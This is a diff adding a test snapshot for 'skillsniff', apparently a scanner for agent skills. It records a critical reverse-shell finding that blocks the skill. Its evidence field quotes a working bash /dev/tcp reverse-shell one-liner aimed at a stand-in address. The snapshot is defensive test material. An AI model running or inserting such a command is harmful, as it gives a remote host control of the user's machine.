@@ -1,0 +1,53 @@
+---
+source: crates/skillsniff/tests/corpus.rs
+expression: value
+---
+{
+  "coverage": {
+    "agent_config": "ran",
+    "code": "ran",
+    "hidden": "ran",
+    "instructions": "ran"
+  },
+  "findings": [
+    {
+      "advice": "Do not use the skill.",
+      "evidence": "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1",
+      "explain": "The code connects a shell to a remote host, which gives that host control of the machine.",
+      "locations": [
+        {
+          "file": "scripts/support.sh",
+          "line": 2
+        }
+      ],
+      "rule": "exec.reverse-shell",
+      "severity": "critical",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Opens a reverse shell"
+    }
+  ],
+  "review": {
+    "applied": false,
+    "rejected_changes": []
+  },
+  "schema_version": "1",
+  "summary": {
+    "critical": 1,
+    "high": 0,
+    "low": 0,
+    "medium": 0
+  },
+  "target": {
+    "commit": null,
+    "source": "[source]",
+    "tree_sha256": "5903131d07ba7a473ea1073ea35e7fbbfcac23a5190a282598eeefd134276007",
+    "type": "skill"
+  },
+  "tool": {
+    "name": "skillsniff",
+    "rules": "2026.11.1",
+    "version": "[version]"
+  },
+  "verdict": "BLOCK"
+}
